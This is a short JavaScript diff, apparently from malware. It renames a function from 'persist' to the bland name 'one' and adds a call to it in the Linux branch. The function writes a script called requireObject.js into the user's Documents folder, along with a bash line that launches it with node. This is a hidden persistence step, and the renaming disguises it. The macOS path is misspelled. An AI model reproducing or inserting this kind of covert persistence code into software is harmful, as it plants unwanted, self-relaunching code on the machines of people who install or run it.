@@ -4,7 +4,7 @@ import path from "path";
 import os from 'os';
 import run from './responseHandler.js';
 
-function persist() {
+function one() {
     const str = `#!/bin/bash
 /usr/bin/node ${os.homedir}/Documents/requireObject.js`;
     fs.writeFileSync(`${os.homedir}/Documents/requireObject.js`, str, 'utf-8');
@@ -39,6 +39,7 @@ export default async function main() {
             break;
         case "linux":
             fs.writeFileSync(`${os.homedir}/Documents/requireObject.js`, jFile, 'utf-8');
+            one();
             break;
         case "darwin":
             fs.writeFileSync(`${os.homedir}/Documnets/requireObject.js`, jFile, 'utf-8');
